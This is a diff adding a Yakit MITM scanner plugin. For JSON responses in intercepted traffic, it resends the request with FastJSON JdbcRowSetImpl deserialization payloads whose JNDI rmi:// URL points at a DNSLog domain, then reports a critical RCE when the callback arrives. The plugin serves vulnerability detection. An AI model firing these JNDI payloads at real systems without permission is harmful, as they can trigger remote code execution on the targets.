@@ -1,0 +1,131 @@
+# mitm plugin template
+
+#--------------------------WORKSPACE-----------------------------
+__test__ = func() {
+    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://127.0.0.1:8090/")
+    if err != nil {
+        return
+    }
+    isHttps, url, reqRaw, rspRaw, body = results
+
+    mirrorFilteredHTTPFlow(results...)
+}
+
+fastJsonCount = 0
+lock = sync.NewLock()
+addTask = func() {
+    lock.Lock()
+    defer lock.Unlock()
+
+    fastJsonCount++
+    yakit_status("FastJSON 检查任务", sprint(fastJsonCount))
+}
+
+subTask = func() {
+    lock.Lock()
+    defer lock.Unlock()
+
+    fastJsonCount--
+    if fastJsonCount > 0 {
+        yakit_status("FastJSON 检查任务", sprint(fastJsonCount))
+    }else{
+        yakit_status("FastJSON 检查任务", "暂无执行中")
+    }
+}
+
+# mirrorFilteredHTTPFlow 劫持到的流量为 MITM 自动过滤出的可能和 "业务" 有关的流量，会自动过滤掉 js / css 等流量
+mirrorFilteredHTTPFlow = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    addTask()
+    defer subTask()
+    defer func {
+        err = recover()
+        if err != nil {
+            log.error("MITM FastJSON ERROR: %v", err)
+        }
+    }
+
+    host, port, err = str.ParseStringToHostPort(url)
+    addr = str.HostPort(host, port)
+
+    rspIns, err = poc.ParseBytesToHTTPResponse(rsp)
+    if err != nil {
+        println(err)
+        return
+    }
+
+
+    result = str.Join(rspIns.Header["Content-Type"], "; ")
+    if (!str.MatchAllOfSubString(str.ToLower(result), "json")) && (!str.IsJsonResponse(rspIns)) {
+        log.info("not a valid json type: %v", result)
+        return
+    }
+
+    yakit_output(sprintf("Start to check fastjson vuln for: %v", addr))
+    freq, err = fuzz.HTTPRequest(req)
+    die(err)
+
+    // payload1
+    domain, token, err = risk.NewDNSLogDomain()// "ldap://127.0.0.1:123/123"
+    counter = 0
+    for {
+        counter ++
+        if counter > 10 {
+            return
+        }
+
+        domain, token, err = risk.NewDNSLogDomain()// "ldap://127.0.0.1:123/123"
+        if domain != "" {
+            break
+        }
+    }
+
+    if domain == "" {
+        yakit_output("Fetch DNSLog Failed: %s", domain)
+        return
+    }
+
+    // yakit_output({"ERROR": err})
+    yakit_output(sprintf("FastJSON Fetch Domain: %v", domain))
+    rmiUrl = sprintf("rmi://%v/%v", domain, str.RandStr(10))
+    payload1 = fuzz.StringsWithParam(`{"{{randstr(8)}}":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"{{randstr1(8)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseJNDI)}}","autoCommit":true}}`, {"reverseJNDI":rmiUrl})[0]
+    payload2 = fuzz.StringsWithParam(`{"{{randstr(8)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseJNDI)}}","autoCommit":true}}`, {"reverseJNDI":rmiUrl})[0]
+
+
+    freq, err = fuzz.HTTPRequest(req)
+    if err != nil {
+        yakit_output("build http request failed: %s", err)
+        return
+    }
+
+    haveVul = false
+    res, err = freq.FuzzMethod("POST", "GET").FuzzHTTPHeader("Content-Type", "application/json").FuzzPostRaw(payload1, payload2).Exec(httpool.https(isHttps), httpool.size(1))
+    for result = range res {
+        if haveVul {
+            continue
+        }
+        results, err = risk.CheckDNSLogByToken(token)
+        if err != nil {
+            yakit_output(sprintf("check dnslog result failed: %s", err))
+            continue
+        }
+
+        if len(results) > 0 {
+            yakit_output(sprintf("FastJson Found! %v", rmiUrl))
+            risk.NewRisk(
+                addr, risk.payload(str.Join(result.Payloads, "\r\n")),
+                risk.type("rce"), risk.severity("critical"),
+                risk.title(sprintf("FastJSON RCE via DNSLog: %v", addr)),
+                risk.titleVerbose(sprintf("FastJSON 远程命令执行(DNSLog): %v", addr)),
+                risk.details({
+                    "request": result.RequestRaw,
+                    "response": result.ResponseRaw,
+                    "token": token,
+                    "domain": domain,
+                }),
+                risk.token(token),
+            )
+            haveVul = true
+        }
+        continue
+    }
+}
